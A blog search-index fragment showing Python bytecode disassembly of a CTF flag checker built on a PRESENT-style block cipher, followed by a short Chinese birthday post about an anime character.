(!=)</span><br><span class="line">            134 POP_JUMP_IF_FALSE      116</span><br><span class="line"></span><br><span class="line"> 25         136 LOAD_NAME                4 (print)</span><br><span class="line">            138 LOAD_CONST               4 (&#x27;wrong flag!&#x27;)</span><br><span class="line">            140 CALL_FUNCTION            1</span><br><span class="line">            142 POP_TOP</span><br><span class="line"></span><br><span class="line"> 26         144 LOAD_NAME                5 (exit)</span><br><span class="line">            146 LOAD_CONST               5 (0)</span><br><span class="line">            148 CALL_FUNCTION            1</span><br><span class="line">            150 POP_TOP</span><br><span class="line">            152 JUMP_ABSOLUTE          116</span><br><span class="line"></span><br><span class="line"> 27     &gt;&gt;  154 LOAD_NAME                4 (print)</span><br><span class="line">            156 LOAD_CONST              15 (&#x27;Correct!&#x27;)</span><br><span class="line">            158 CALL_FUNCTION            1</span><br><span class="line">            160 POP_TOP</span><br><span class="line">            162 LOAD_CONST               6 (None)</span><br><span class="line">            164 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object encrypt at 0x7f57c4c3aa80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_CONST               1 (32)</span><br><span class="line">              2 STORE_FAST               1 (rounds)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (generateRoundkeys80)</span><br><span class="line">              6 LOAD_CONST               2 (85354531916197809168417)</span><br><span class="line">              8 LOAD_FAST                1 (rounds)</span><br><span class="line">             10 CALL_FUNCTION            2</span><br><span class="line">             12 STORE_FAST               2 (roundkeys)</span><br><span class="line"></span><br><span class="line">  5          14 BUILD_LIST               0</span><br><span class="line">             16 STORE_FAST               3 (out)</span><br><span class="line"></span><br><span class="line">  6          18 LOAD_FAST                0 (blocks)</span><br><span class="line">             20 GET_ITER</span><br><span class="line">        &gt;&gt;   22 FOR_ITER                84 (to 108)</span><br><span class="line">             24 STORE_FAST               4 (block)</span><br><span class="line"></span><br><span class="line">  7          26 LOAD_GLOBAL              1 (string2number)</span><br><span class="line">             28 LOAD_FAST                4 (block)</span><br><span class="line">             30 CALL_FUNCTION            1</span><br><span class="line">             32 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line">  8          34 LOAD_GLOBAL              2 (range)</span><br><span class="line">             36 LOAD_FAST                1 (rounds)</span><br><span class="line">             38 LOAD_CONST               3 (1)</span><br><span class="line">             40 BINARY_SUBTRACT</span><br><span class="line">             42 CALL_FUNCTION            1</span><br><span class="line">             44 GET_ITER</span><br><span class="line">        &gt;&gt;   46 FOR_ITER                34 (to 82)</span><br><span class="line">             48 STORE_FAST               6 (i)</span><br><span class="line"></span><br><span class="line">  9          50 LOAD_GLOBAL              3 (addRoundKey)</span><br><span class="line">             52 LOAD_FAST                5 (state)</span><br><span class="line">             54 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             56 LOAD_FAST                6 (i)</span><br><span class="line">             58 BINARY_SUBSCR</span><br><span class="line">             60 CALL_FUNCTION            2</span><br><span class="line">             62 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line"> 10          64 LOAD_GLOBAL              4 (sBoxLayer)</span><br><span class="line">             66 LOAD_FAST                5 (state)</span><br><span class="line">             68 CALL_FUNCTION            1</span><br><span class="line">             70 STORE_FAST               5 (state)</span><br><span class="line"></span><br><span class="line"> 11          72 LOAD_GLOBAL              5 (pLayer)</span><br><span class="line">             74 LOAD_FAST                5 (state)</span><br><span class="line">             76 CALL_FUNCTION            1</span><br><span class="line">             78 STORE_FAST               5 (state)</span><br><span class="line">             80 JUMP_ABSOLUTE           46</span><br><span class="line"></span><br><span class="line"> 12     &gt;&gt;   82 LOAD_GLOBAL              3 (addRoundKey)</span><br><span class="line">             84 LOAD_FAST                5 (state)</span><br><span class="line">             86 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             88 LOAD_CONST               4 (-1)</span><br><span class="line">             90 BINARY_SUBSCR</span><br><span class="line">             92 CALL_FUNCTION            2</span><br><span class="line">             94 STORE_FAST               7 (cipher)</span><br><span class="line"></span><br><span class="line"> 13          96 LOAD_FAST                3 (out)</span><br><span class="line">             98 LOAD_METHOD              6 (append)</span><br><span class="line">            100 LOAD_FAST                7 (cipher)</span><br><span class="line">            102 CALL_METHOD              1</span><br><span class="line">            104 POP_TOP</span><br><span class="line">            106 JUMP_ABSOLUTE           22</span><br><span class="line"></span><br><span class="line"> 14     &gt;&gt;  108 LOAD_FAST                3 (out)</span><br><span class="line">            110 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line"> 12          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object generateRoundkeys80 at 0x7f133db26a80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 BUILD_LIST               0</span><br><span class="line">              2 STORE_FAST               2 (roundkeys)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (range)</span><br><span class="line">              6 LOAD_CONST               1 (1)</span><br><span class="line">              8 LOAD_FAST                1 (rounds)</span><br><span class="line">             10 LOAD_CONST               1 (1)</span><br><span class="line">             12 BINARY_ADD</span><br><span class="line">             14 LOAD_CONST               1 (1)</span><br><span class="line">             16 CALL_FUNCTION            3</span><br><span class="line">             18 GET_ITER</span><br><span class="line">        &gt;&gt;   20 FOR_ITER                90 (to 112)</span><br><span class="line">             22 STORE_FAST               3 (i)</span><br><span class="line"></span><br><span class="line">  5          24 LOAD_FAST                2 (roundkeys)</span><br><span class="line">             26 LOAD_METHOD              1 (append)</span><br><span class="line">             28 LOAD_FAST                0 (key)</span><br><span class="line">             30 LOAD_CONST               2 (16)</span><br><span class="line">             32 BINARY_RSHIFT</span><br><span class="line">             34 CALL_METHOD              1</span><br><span class="line">             36 POP_TOP</span><br><span class="line"></span><br><span class="line">  6          38 LOAD_FAST                0 (key)</span><br><span class="line">             40 LOAD_CONST               3 (524287)</span><br><span class="line">             42 BINARY_AND</span><br><span class="line">             44 LOAD_CONST               4 (61)</span><br><span class="line">             46 BINARY_LSHIFT</span><br><span class="line">             48 LOAD_FAST                0 (key)</span><br><span class="line">             50 LOAD_CONST               5 (19)</span><br><span class="line">             52 BINARY_RSHIFT</span><br><span class="line">             54 BINARY_ADD</span><br><span class="line">             56 STORE_FAST               0 (key)</span><br><span class="line"></span><br><span class="line">  7          58 LOAD_GLOBAL              2 (Sbox)</span><br><span class="line">             60 LOAD_FAST                0 (key)</span><br><span class="line">             62 LOAD_CONST               6 (76)</span><br><span class="line">             64 BINARY_RSHIFT</span><br><span class="line">             66 BINARY_SUBSCR</span><br><span class="line">             68 LOAD_CONST               6 (76)</span><br><span class="line">             70 BINARY_LSHIFT</span><br><span class="line">             72 LOAD_FAST                0 (key)</span><br><span class="line">             74 LOAD_CONST               7 (2)</span><br><span class="line">             76 LOAD_CONST               6 (76)</span><br><span class="line">             78 BINARY_POWER</span><br><span class="line">             80 LOAD_CONST               1 (1)</span><br><span class="line">             82 BINARY_SUBTRACT</span><br><span class="line">             84 BINARY_AND</span><br><span class="line">             86 BINARY_ADD</span><br><span class="line">             88 STORE_FAST               0 (key)</span><br><span class="line"></span><br><span class="line">  8          90 LOAD_FAST                0 (key)</span><br><span class="line">             92 LOAD_FAST                3 (i)</span><br><span class="line">             94 LOAD_CONST               8 (15)</span><br><span class="line">             96 BINARY_LSHIFT</span><br><span class="line">             98 LOAD_FAST                0 (key)</span><br><span class="line">            100 LOAD_CONST               5 (19)</span><br><span class="line">            102 BINARY_RSHIFT</span><br><span class="line">            104 BINARY_XOR</span><br><span class="line">            106 INPLACE_XOR</span><br><span class="line">            108 STORE_FAST               0 (key)</span><br><span class="line">            110 JUMP_ABSOLUTE           20</span><br><span class="line"></span><br><span class="line">  9     &gt;&gt;  112 LOAD_FAST                2 (roundkeys)</span><br><span class="line">            114 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line">  6          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object string2number at 0x7f7370421a80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_GLOBAL              0 (sum)</span><br><span class="line">              2 LOAD_CLOSURE             0 (i)</span><br><span class="line">              4 BUILD_TUPLE              1</span><br><span class="line">              6 LOAD_CONST               1 (&lt;code object &lt;listcomp&gt; at 0x7f73704aba80, file &quot;&quot;, line 3&gt;)</span><br><span class="line">              8 LOAD_CONST               2 (&#x27;string2number.&lt;locals&gt;.&lt;listcomp&gt;&#x27;)</span><br><span class="line">             10 MAKE_FUNCTION            8 (closure)</span><br><span class="line">             12 LOAD_GLOBAL              1 (range)</span><br><span class="line">             14 LOAD_CONST               3 (8)</span><br><span class="line">             16 CALL_FUNCTION            1</span><br><span class="line">             18 GET_ITER</span><br><span class="line">             20 CALL_FUNCTION            1</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7f73704aba80, file &quot;&quot;, line 3&gt;:</span><br><span class="line">  3           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                24 (to 30)</span><br><span class="line">              6 STORE_FAST               1 (c)</span><br><span class="line">              8 LOAD_GLOBAL              0 (ord)</span><br><span class="line">             10 LOAD_DEREF               0 (i)</span><br><span class="line">             12 LOAD_FAST                1 (c)</span><br><span class="line">             14 BINARY_SUBSCR</span><br><span class="line">             16 CALL_FUNCTION            1</span><br><span class="line">             18 LOAD_CONST               0 (8)</span><br><span class="line">             20 LOAD_FAST                1 (c)</span><br><span class="line">             22 BINARY_MULTIPLY</span><br><span class="line">             24 BINARY_LSHIFT</span><br><span class="line">             26 LIST_APPEND              2</span><br><span class="line">             28 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   30 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line">  9          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object pLayer at 0x7f023882ba80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_CONST               1 (0)</span><br><span class="line">              2 STORE_FAST               1 (output)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (range)</span><br><span class="line">              6 LOAD_CONST               2 (64)</span><br><span class="line">              8 CALL_FUNCTION            1</span><br><span class="line">             10 GET_ITER</span><br><span class="line">        &gt;&gt;   12 FOR_ITER                28 (to 42)</span><br><span class="line">             14 STORE_FAST               2 (i)</span><br><span class="line"></span><br><span class="line">  5          16 LOAD_FAST                1 (output)</span><br><span class="line">             18 LOAD_FAST                0 (state)</span><br><span class="line">             20 LOAD_FAST                2 (i)</span><br><span class="line">             22 BINARY_RSHIFT</span><br><span class="line">             24 LOAD_CONST               3 (1)</span><br><span class="line">             26 BINARY_AND</span><br><span class="line">             28 LOAD_GLOBAL              1 (PBox)</span><br><span class="line">             30 LOAD_FAST                2 (i)</span><br><span class="line">             32 BINARY_SUBSCR</span><br><span class="line">             34 BINARY_LSHIFT</span><br><span class="line">             36 INPLACE_ADD</span><br><span class="line">             38 STORE_FAST               1 (output)</span><br><span class="line">             40 JUMP_ABSOLUTE           12</span><br><span class="line"></span><br><span class="line">  6     &gt;&gt;   42 LOAD_FAST                1 (output)</span><br><span class="line">             44 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line">  9          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object sBoxLayer at 0x7fab1d117a80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_CONST               1 (0)</span><br><span class="line">              2 STORE_FAST               1 (output)</span><br><span class="line"></span><br><span class="line">  4           4 LOAD_GLOBAL              0 (range)</span><br><span class="line">              6 LOAD_CONST               2 (16)</span><br><span class="line">              8 CALL_FUNCTION            1</span><br><span class="line">             10 GET_ITER</span><br><span class="line">        &gt;&gt;   12 FOR_ITER                36 (to 50)</span><br><span class="line">             14 STORE_FAST               2 (i)</span><br><span class="line"></span><br><span class="line">  5          16 LOAD_FAST                1 (output)</span><br><span class="line">             18 LOAD_GLOBAL              1 (Sbox)</span><br><span class="line">             20 LOAD_FAST                0 (state)</span><br><span class="line">             22 LOAD_FAST                2 (i)</span><br><span class="line">             24 LOAD_CONST               3 (4)</span><br><span class="line">             26 BINARY_MULTIPLY</span><br><span class="line">             28 BINARY_RSHIFT</span><br><span class="line">             30 LOAD_CONST               4 (15)</span><br><span class="line">             32 BINARY_AND</span><br><span class="line">             34 BINARY_SUBSCR</span><br><span class="line">             36 LOAD_FAST                2 (i)</span><br><span class="line">             38 LOAD_CONST               3 (4)</span><br><span class="line">             40 BINARY_MULTIPLY</span><br><span class="line">             42 BINARY_LSHIFT</span><br><span class="line">             44 INPLACE_ADD</span><br><span class="line">             46 STORE_FAST               1 (output)</span><br><span class="line">             48 JUMP_ABSOLUTE           12</span><br><span class="line"></span><br><span class="line">  6     &gt;&gt;   50 LOAD_FAST                1 (output)</span><br><span class="line">             52 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 STORE_NAME               3 (co)</span><br><span class="line"></span><br><span class="line">  6          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object addRoundKey at 0x7f5223878a80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_FAST                0 (state)</span><br><span class="line">              2 LOAD_FAST                1 (roundkey)</span><br><span class="line">              4 BINARY_XOR</span><br><span class="line">              6 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            210 CALL_METHOD              1</span><br><span class="line">            212 STORE_NAME               7 (co)</span><br><span class="line"></span><br><span class="line"> 12         214 LOAD_NAME                8 (exec)</span><br><span class="line">            216 LOAD_NAME                7 (co)</span><br><span class="line">            218 CALL_FUNCTION            1</span><br><span class="line">            220 POP_TOP</span><br><span class="line">            222 LOAD_CONST              69 (None)</span><br><span class="line">            224 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7f7b29b00a80, file &quot;&quot;, line 4&gt;:</span><br><span class="line">  4           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                14 (to 20)</span><br><span class="line">              6 STORE_FAST               1 (x)</span><br><span class="line">              8 LOAD_GLOBAL              0 (Sbox)</span><br><span class="line">             10 LOAD_METHOD              1 (index)</span><br><span class="line">             12 LOAD_FAST                1 (x)</span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 LIST_APPEND              2</span><br><span class="line">             18 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   20 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7f7b29a76a80, file &quot;&quot;, line 9&gt;:</span><br><span class="line">  9           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                14 (to 20)</span><br><span class="line">              6 STORE_FAST               1 (x)</span><br><span class="line">              8 LOAD_GLOBAL              0 (PBox)</span><br><span class="line">             10 LOAD_METHOD              1 (index)</span><br><span class="line">             12 LOAD_FAST                1 (x)</span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 LIST_APPEND              2</span><br><span class="line">             18 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   20 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></details>]]></content>
      
      
      <categories>
          
          <category> CTF-WP </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>12.3 KasakiNozomi&#39;s Birthday!</title>
      <link href="/12-3-KasakiNozomi-s-Birthday/"/>
      <url>/12-3-KasakiNozomi-s-Birthday/</url>
      
        <content type="html"><![CDATA[<p><strong>今天是伞哥哥的生日啊！</strong></p><span id="more"></span><p><img src="https://s2.loli.net/2023/12/03/uknXZsdHrz42wPN.jpg" alt="3092507-20230224232909457-349401112.jpg"></p><p>我最最最最最最最喜欢的角色啊！！！<br>感谢京阿尼 感谢京吹 感谢利兹与青鸟~<br>这也差不多是入坑二次元一年吧~ 这一年来也改变了许许多多~<br>借霙的话吧~<br>喜欢希美的笑声        喜欢希美的一言一语<br>喜欢希美的脚步声      喜欢希美的头发<br>喜欢……<br>希美的一切~<br>🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂🎂</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
